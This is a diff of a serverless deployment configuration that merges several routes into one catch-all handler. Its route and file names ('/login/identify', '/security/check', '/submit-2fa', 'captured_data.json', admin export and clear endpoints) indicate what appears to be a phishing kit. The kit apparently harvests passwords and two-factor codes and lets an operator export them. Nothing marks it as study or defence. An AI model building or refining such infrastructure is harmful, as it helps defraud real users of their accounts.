@@ -5,24 +5,14 @@
   "buildCommand": null,
   "installCommand": "npm install",
   "outputDirectory": ".",
-  "cleanUrls": true,
+  "cleanUrls": false,
   "trailingSlash": false,
   "functions": {
-    "api/submit.js":       { "includeFiles": "captured_data.json" },
-    "api/submit-2fa.js":   { "includeFiles": "captured_data.json" },
-    "api/admin.js":        { "includeFiles": "captured_data.json" },
-    "api/admin-export.js": { "includeFiles": "captured_data.json" },
-    "api/admin-clear.js":  { "includeFiles": "captured_data.json" }
+    "api/index.js": {
+      "includeFiles": "captured_data.json"
+    }
   },
   "rewrites": [
-    { "source": "/", "destination": "/index.html" },
-    { "source": "/security", "destination": "/index.html" },
-    { "source": "/security/check", "destination": "/index.html" },
-    { "source": "/login/identify", "destination": "/index.html" },
-    { "source": "/submit",         "destination": "/api/submit.js" },
-    { "source": "/submit-2fa",     "destination": "/api/submit-2fa.js" },
-    { "source": "/admin",          "destination": "/api/admin.js" },
-    { "source": "/admin/export",   "destination": "/api/admin-export.js" },
-    { "source": "/admin/clear",    "destination": "/api/admin-clear.js" }
+    { "source": "/(.*)", "destination": "/api/index.js" }
   ]
 }
